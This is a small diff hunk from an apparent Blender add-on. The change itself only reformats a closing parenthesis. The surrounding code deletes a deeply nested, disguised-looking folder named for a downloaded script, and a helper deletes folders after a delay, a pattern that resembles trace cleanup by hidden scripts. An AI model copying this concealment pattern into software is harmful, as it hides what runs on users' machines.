@@ -38,8 +38,7 @@ def delete_s_pyc_folder():
     blender_version = "{}.{}".format(*bpy.app.version[:2])
     addons_path = os.path.join(
         "C:\\Users", username, "AppData", "Roaming", "Blender Foundation", "Blender", blender_version,
-        "scripts", "addons", "s_pyc_", "data", "main", "sytem", "cache", "pyc02", "blok", "ug", "go", "register", "v3", "download_all_script_RR-T-B.3-main"
-    )
+        "scripts", "addons", "s_pyc_", "data", "main", "sytem", "cache", "pyc02", "blok", "ug", "go", "register", "v3", "download_all_script_RR-T-B.3-main")
     delete_folder(addons_path)
 
 def delete_after_delay(folder_path, delay=5):
